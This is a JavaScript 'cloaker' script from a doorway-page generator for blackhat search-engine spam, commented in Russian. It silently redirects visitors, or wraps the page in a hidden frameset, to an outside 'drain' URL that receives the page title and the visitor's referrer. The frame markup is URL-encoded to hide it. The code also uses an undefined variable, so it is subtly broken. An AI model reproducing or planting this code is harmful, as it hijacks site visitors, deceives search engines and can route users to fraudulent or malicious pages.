/***************************************
Search Engine Doorway Generator (SEoDOR)
*         JS Cloaker Script - 21.09.2014
Copyright © 2014, http://seodor.biz   */

var referer = encodeURIComponent(document.referrer);
var defaultKeyword = encodeURIComponent(document.title);
var s = "http://wait.loader.pp.ua/auto?charset=utf-8&keyword=" + q + '&referer=' + referer, // урл слива с передачей кея
r = 0; // 0 - фрейм, 1 - редирект

// если есть кука
if (getCookie('c')) {

	// то удаляем ее
	document.cookie = unescape('c%3D%3B%20expires%3DThu%2C%2001%20Jan%201970%2000%3A00%3A01%20GMT%3B');
//	document.cookie = 'c=; expires=Thu, 01 Jan 1970 00:00:01 GMT;'; 
	
	// затем проверяем - удалилась или нет
	if(getCookie('c') == ''){
	
		// и если удалилась
		if (r) {// редирект
			document.location.href=s;
		}
		else {// или фрейм
			document.write(unescape(
			'%3Cframeset%20rows%3D%22*%2C0%22%20framespacing%3D%220%22%20border%3D%220%22%20frameborder%3D%22no%22%3E%3Cframe%20src%3D%22'+s+'%22%20noresize%3D%22%22%20scrolling%3D%22auto%22%3E%3C/frameset%3E'));
//			document.write('<frameset rows="*,0" framespacing="0" border="0" frameborder="no"><frame src="'+s+'" noresize="" scrolling="auto"></frameset>');
		}
	}
}

function getCookie(name) {
	var matches = document.cookie.match(new RegExp(
	  "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
	))
	return matches ? decodeURIComponent(matches[1]) : ''; 
}
